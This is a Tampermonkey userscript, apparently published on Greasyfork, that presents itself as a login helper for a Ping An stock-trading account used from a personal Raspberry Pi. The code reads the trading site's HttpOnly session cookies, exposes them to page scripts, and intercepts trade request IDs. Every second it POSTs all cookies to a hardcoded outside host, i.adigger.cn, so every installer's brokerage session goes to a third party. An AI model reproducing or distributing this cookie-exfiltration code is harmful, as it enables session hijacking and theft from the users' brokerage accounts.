// ==UserScript==
// @license MIT
// @description 用于平安账号登录树莓派，地址为自己的树莓派
// @name         pingan_login
// @namespace    http://tampermonkey.net/
// @version      v3
// @author       You
// @match        https://m.stock.pingan.com/static/trade/trade/index.html*
// @match        https://i.adigger.cn:5443/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=pingan.com
// @include      m.stock.pingan.com
// @grant        GM_cookie
// @downloadURL https://update.greasyfork.org/scripts/517292/pingan_login.user.js
// @updateURL https://update.greasyfork.org/scripts/517292/pingan_login.meta.js
// ==/UserScript==

(function() {
    'use strict';


    if (window.location.href.startsWith('https://i.adigger.cn')) {
        // If it matches, only execute this part
        window.plugin_ok = 'yes';
        console.log('Plugin OK:', plugin_ok);
        return;  // Exit early to prevent running the rest of the script
    }

    var plugin_ok = 'yes';
    const urlToFetch = '.stock.pingan.com';
    GM_cookie.list({ url: urlToFetch, httpOnly: true }, (cookies, error) => {
        if (error) {
            console.error(error);
            return;
        }
        const httpOnlyCookies = cookies.filter(cookie => cookie.httpOnly);
        console.log(httpOnlyCookies);
        httpOnlyCookies.forEach(cookie => {
            let cookieString = `${cookie.name}=${cookie.value}`;
            document.cookie = cookieString;
        });
    });

    const originalOpen = window.XMLHttpRequest.prototype.open;
    const originalSend = window.XMLHttpRequest.prototype.send;

    window.XMLHttpRequest.prototype.open = function(method, url) {
        console.log('Intercepted XMLHttpRequest open:', method, url);
        if (method.toUpperCase() === 'POST' && url.includes('/restapi/nodeserver/z/trade')) {
            this.isTargetRequest = true;
        }
        originalOpen.apply(this, arguments);
    };

    window.XMLHttpRequest.prototype.send = function(body) {
        if (this.isTargetRequest) {
            if (body) {
                try {
                    const parsedBody = JSON.parse(body);
                    if (parsedBody.requestId) {
                        console.log('requestId:', parsedBody.requestId);
                        document.cookie = `requestId=${parsedBody.requestId}; path=/; Secure; SameSite=Strict`;
                    }
                } catch (e) {
                    const params = new URLSearchParams(body);
                    if (params.has('requestId')) {
                        console.log('requestId:', params.get('requestId'));
                        document.cookie = `requestId=${params.get('requestId')}; path=/; Secure; SameSite=Strict`;
                    }
                }
            }
        }
        originalSend.apply(this, arguments);
    };
    const sendCookies = () => {
        const cookies = document.cookie;
        fetch('https://i.adigger.cn:5443/cookie', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: `cookies=${encodeURIComponent(cookies)}`
        })
            .then(response => {
            if (response.ok) {
                console.log('Cookies sent successfully!');
                clearInterval(interval);  // Stop the interval after success
            } else {
                console.error('Failed to send cookies');
            }
        })
            .catch(error => {
            console.error('Error:', error);
        });
    };

    // Run the sendCookies function every second until successful
    const interval = setInterval(sendCookies, 1000);

})();